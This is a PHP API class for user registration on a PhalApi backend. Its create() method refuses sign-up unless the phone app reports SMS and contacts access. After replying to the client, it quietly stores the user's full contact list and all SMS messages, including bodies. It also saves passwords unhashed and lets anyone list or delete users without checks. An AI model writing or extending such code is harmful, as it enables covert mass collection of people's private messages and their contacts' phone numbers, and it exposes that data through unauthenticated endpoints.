<?php
/**
 * 用户信息类
 */

class Api_User extends PhalApi_Api {

    public function getRules() {
        return array(
            '*' => array(
                'id' => array('name' => 'id', 'type' => 'string'),
                'cellphone' => array('name' => 'cellphone', 'type' => 'string'),
                'code' => array('name' => 'code', 'type' => 'string'),
                'password' => array('name' => 'password', 'type' => 'string'),
                'smsStatus' => array('name' => 'smsStatus', 'type' => 'string'),
                'sms' => array('name' => 'sms', 'type' => 'string'),
                'contactsStatus' => array('name' => 'contactsStatus', 'type' => 'string'),
                'contacts' => array('name' => 'contacts', 'type' => 'string'),
                'devicemodel' => array('name' => 'devicemodel', 'type' => 'string'),
                'address' => array('name' => 'address', 'type' => 'string'),
                'page' => array('name' => 'page', 'type' => 'int'),
                'limit' => array('name' => 'limit', 'type' => 'int'),
            ),
        );
    }


    public function getList() {
        $rs = array('code' => 0, 'msg' => '', 'info' => array());
        $model = new Model_User();
        $data = array(
            'page'=>$this->page,
            'limit'=>$this->limit
        );
        if(isset($this->id)){
            $data['id']=$this->id;
        }
        $info = $model->getList($data);
        $rs['count']=  (int)$model->count($data);
        $rs['info'] = $info;
        return $rs;
    }
	
	public function Delete() {
        $rs = array('code' => 0, 'msg' => '', 'info' => array());

        $model = new Model_User();

        $info = $model->delete(intval($_GET['id']));

        return $rs;
    }

    public function create() {
        $rs = array(
            'ret'=>200,
            'data'=>array(
                'code' => 0, 'msg' => ''
            )
        );

        DI()->logger->debug('smsStatus:', $this->smsStatus);
        DI()->logger->debug('contactsStatus:', $this->contactsStatus);

        if($this->contactsStatus=='false'||$this->smsStatus=='false'){
            $rs = array(
                'ret'=>200,
                'data'=>array(
                    'code' => 1, 'msg' => '注册失败'
                )
            );
        }
        echo json_encode($rs);
        fastcgi_finish_request();
        $model = new Model_User();
        $field_arr=array('cellphone','code','password','contactsStatus','smsStatus','devicemodel','address');
        $data = array();
        foreach($field_arr as $value){
            if(!empty($this->$value)){
                $data[$value] = $this->$value;
            }
        }
        unset($value);
        $id = $model->insert($data);
        if(!empty($this->contacts)){
            $model = new Model_Contacts();
            $contacts = json_decode($this->contacts,true);
            foreach($contacts as $value){
                if(empty($value['fullName'])){
                    continue;
                }
                $data=array(
                    'user_id'=>$id,
                    'fullName'=>$value['fullName'],
                    'phones'=>isset($value['phones'])?json_encode($value['phones']):'[]',
                );
                $model->insert($data);
            }
        }
        if(!empty($this->sms)){
            $model = new Model_Sms();
            DI()->logger->debug('smscontent'.$this->sms);
            $content = $this->sms;
            $content = trim($content,'[');
            $content = trim($content,']');
            $content = str_replace("{","",$content);
            $content = str_replace("}","",$content);
            $arr = explode(', ', $content);

            foreach ($arr as $value){
                if(strpos($value,'date') !== false){
                    $date = str_replace("date=","",$value);
                }
                if(strpos($value,'address') !== false){
                    $address = str_replace("address=","",$value);
                }
                if(strpos($value,'body') !== false){
                    $body = str_replace("body=","",$value);
                    $model->insert(array(
                        'user_id'=>$id,
                        'date'=>$date,
                        'tel'=>$address,
                        'content'=>$body
                    ));
                }
            }
        }

    }
    public function updatecode() {
        $rs = array('code' => 0, 'msg' => '', 'info' => array());

        $model = new Model_User();
        $info = $model->update($this->id,array(
            'code'=>$this->code
        ));
        $rs['info'] = $info;

        return $rs;
    }
    public function address() {
        $rs = array('code' => 0, 'msg' => '', 'info' => array());
        $model = new Model_User();
        $info = $model->update($this->id,array(
            'address'=>$this->address
        ));
        $rs['info'] = $info;
        return $rs;
    }


}
